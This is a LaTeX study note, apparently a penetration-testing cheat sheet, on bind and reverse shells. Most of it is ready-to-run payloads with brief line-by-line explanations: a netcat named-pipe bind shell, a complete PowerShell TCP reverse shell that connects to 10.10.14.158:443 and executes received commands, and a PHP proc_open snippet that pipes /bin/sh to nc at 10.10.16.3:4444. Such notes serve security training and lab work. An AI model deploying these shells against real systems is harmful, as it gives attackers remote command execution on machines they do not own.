\section{Shell basic}
\url{https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows}

\url{https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux}



With a bind shell, the target system has a listener started and awaits a
connection from a attacker's system. 

With a reverse shell, the attack box will have a listener running, and the
target will need to initiate the connection.

\subsection{Bind shell}

\subsubsection{netcat}
\begin{verbatim}
Target@server:~$ nc -lvnp $PORT_NUMBER
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $IP $PORT > /tmp/f
\end{verbatim}
\begin{itemize}
    \item remove named pipe if exist
    \item create a
         \href{https://man7.org/linux/man-pages/man7/fifo.7.html}{FIFO named
        pipe}
    \item redirect instruction to interactive bash which std error and std in
        are redirected to nc
    \item redirect nc to the pipe
\end{itemize}

\begin{verbatim}
nc -nv $TARGET_IP $PORT_NUMBER
\end{verbatim}

\subsection{Reverse shell}

\href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md}{Reverse
Shell Cheat Sheet}

\begin{verbatim}
powershell -nop -c "
    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
    };
    $client.Close()"
\end{verbatim}


\begin{itemize}
    \item exec poweshell with no profile ans script block
    \item bind a socket
    \item set the command stream
    \item create empty byte stream 
    \item iterate 
    \begin{itemize}
        \item transform the buffer the byte stream to ASCII
        \item Invoke-Expression (iex) on the command set the content in
        \verb+$sendback+ hen redirects the standard error and std input to
        \verb+Out-String+ cmdlet
        \item show Working Directory
        \item Sets Sendbyte equal to the ASCII encoded byte stream that will
            use a TCP client to initiate a PowerShell session with a Netcat
    \end{itemize}
    \item close the TCP connection 

\end{itemize}

\subsubsection{PHP proc\_open}
\begin{verbatim}
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
 );

 $cwd = '/tmp';
 $env = array('some_option' => 'aeiou');

 $process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

 if (is_resource($process)) {
     // $pipes now looks like this:
     // 0 => writeable handle connected to child stdin
     // 1 => readable handle connected to child stdout
     // Any error output will be appended to /tmp/error-output.txt

     //fwrite($pipes[0], 'nc 10.10.16.3 4444');
     fwrite($pipes[0], 'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/f');
     fclose($pipes[0]);

     echo stream_get_contents($pipes[1]);
     fclose($pipes[1]);

     // It is important that you close any pipes before calling
     // proc_close in order to avoid a deadlock
     $return_value = proc_close($process);

     echo "command returned $return_value\n";
 }
 \end{verbatim}
